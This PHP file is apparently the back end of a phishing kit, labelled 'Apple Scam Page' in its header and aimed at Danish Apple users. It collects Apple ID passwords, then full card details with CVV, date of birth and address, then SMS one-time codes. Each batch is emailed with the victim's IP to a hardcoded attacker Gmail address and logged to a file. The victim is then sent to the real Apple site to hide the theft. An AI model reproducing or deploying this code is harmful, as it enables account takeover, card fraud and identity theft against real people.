<?php
/**
 * @link              https://www.facebook.com/hamidakhatar
 * @since             2019
 * @package           Apple Scam Page
 *
 * Project Name:      Apple Scam
 * Author:            Hamid Akhatar
 * Author URI:        https://www.facebook.com/hamidakhatar
 */
session_start();
include_once '../inc/app.php';
$to = 'hd.rzzzlt@gmail.com';

$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);
$get_user_countrycode = get_user_countrycode(get_user_ip());

if($_SERVER['REQUEST_METHOD'] == "POST") {

    if ($_POST['type'] == "login") {

        $_SESSION['apple_id']       = $_POST['apple_id'];
        $_SESSION['apple_password'] = $_POST['apple_password'];

        $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Login';
        $message = '/-- LOG INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'ID : ' . $_POST['apple_id'] . "\r\n";
        $message .= 'PASSWORD : ' . $_POST['apple_password'] . "\r\n";
        $message .= '/-- END LOG INFOS --/' . "\r\n";
        $headers = "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
        $from = "From: login <logs@dioury.hk>";

        mail($to,$subject,$message,$headers,$From);
        file_put_contents("../hkd.txt", $message, FILE_APPEND);
        unset($_SESSION['errors']);
        header("location: card_details.php?cmd=_update&dispatch=$dispatch&locale=dk_$get_user_countrycode");

    }

    if ($_POST['type'] == "card") {
        
        $_SESSION['card_number']    = $_POST['card_number'];
        $_SESSION['card_date']      = $_POST['card_date'];
        $_SESSION['card_cvv']       = $_POST['card_cvv'];
        $_SESSION['first_name']     = $_POST['first_name'];
        $_SESSION['last_name']      = $_POST['last_name'];
        $_SESSION['date_of_birth']  = $_POST['date_of_birth'];
        $_SESSION['address']        = $_POST['address'];
        $_SESSION['postal_code']    = $_POST['postal_code'];
        $_SESSION['phone']          = $_POST['phone'];

        $_SESSION['errors'] = [];
        if(validate_card($_POST['card_number']) == false) {
            $_SESSION['errors']['card_number'] = 'Angiv en gyldig kortnummer.';
        }

        if( validate_date($_POST['card_date'], 'm/y') == false ) {
            $_SESSION['errors']['card_date'] = 'Angiv en gyldig udløbsdato.';
        }

        if( validate_cvv($_POST['card_cvv']) == false ) {
            $_SESSION['errors']['card_cvv'] = 'Angiv en gyldig kontrolcifrene for dit kort';
        }

        if( validate_name($_POST['first_name']) == false ) {
            $_SESSION['errors']['first_name'] = 'Angiv en gyldig fornavn.';
        }

        if( validate_name($_POST['last_name']) == false ) {
            $_SESSION['errors']['last_name'] = 'Angiv en gyldig efternavn.';
        }

        if( validate_date($_POST['date_of_birth'], 'd/m/Y') == false ) {
            $_SESSION['errors']['date_of_birth'] = 'Angiv en gyldig udløbsdato.';
        }

        if( empty($_POST['address']) ) {
            $_SESSION['errors']['address'] = 'Angiv en gyldig vej og nr.';
        }

        if( validate_number($_POST['postal_code']) == false ) {
            $_SESSION['errors']['postal_code'] = 'Angiv en gyldig postnummer.';
        }

        if( empty($_POST['city']) ) {
            $_SESSION['errors']['city'] = 'Angiv en gyldig by.';
        }

        if( empty($_POST['phone']) ) {
            $_SESSION['errors']['phone'] = 'Angiv en gyldig telefonnummer.';
        }

        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Card Details';
            $message = '/-- CARD DETAILS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'Card Number : ' . $_POST['card_number'] . "\r\n";
            $message .= 'Card CVV : ' . $_POST['card_date'] . "\r\n";
            $message .= 'CVV : ' . $_POST['card_cvv'] . "\r\n";
            $message .= 'First Name : ' . $_POST['first_name'] . "\r\n";
            $message .= 'Last Name : ' . $_POST['last_name'] . "\r\n";
            $message .= 'Date Of Birth : ' . $_POST['date_of_birth'] . "\r\n";
            $message .= 'Address : ' . $_POST['address'] . "\r\n";
            $message .= 'Zip Code : ' . $_POST['postal_code'] . "\r\n";
            $message .= 'City : ' . $_POST['city'] . "\r\n";
            $message .= 'Phone : ' . $_POST['phone'] . "\r\n";
            $message .= '/-- END CARD DETAILS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../hkd.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: sms.php?cmd=_update&dispatch=$dispatch&locale=dk_$get_user_countrycode");

        } else {
            header("location: card_details.php?cmd=_update&dispatch=$dispatch&locale=dk_$get_user_countrycode");
        }

    }

    if ($_POST['type'] == "sms") {

        $_SESSION['sms_code']       = $_POST['sms_code'];

        $_SESSION['errors'] = [];

        if( empty($_POST['sms_code']) ) {
            $_SESSION['errors']['sms_code'] = 'Angiv en gyldig sms-kode.';
        }


        if( count($_SESSION['errors']) == 0 ) {

            $subject = $_SERVER['REMOTE_ADDR'] . ' | Apple | Sms';
            $message = '/-- SMS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'SMS : ' . $_POST['sms_code'] . "\r\n";
            $message .= '/-- END SMS --/' . "\r\n";
            $headers = "MIME-Version: 1.0" . "\r\n";
            $headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";

            mail($to,$subject,$message,$headers);
            file_put_contents("../hkd.txt", $message, FILE_APPEND);
            session_destroy();
            header("location: https://appleid.apple.com");

        } else {
            header("location: sms.php?cmd=_update&dispatch=$dispatch&locale=dk_$get_user_countrycode");
        }

    }

}

?>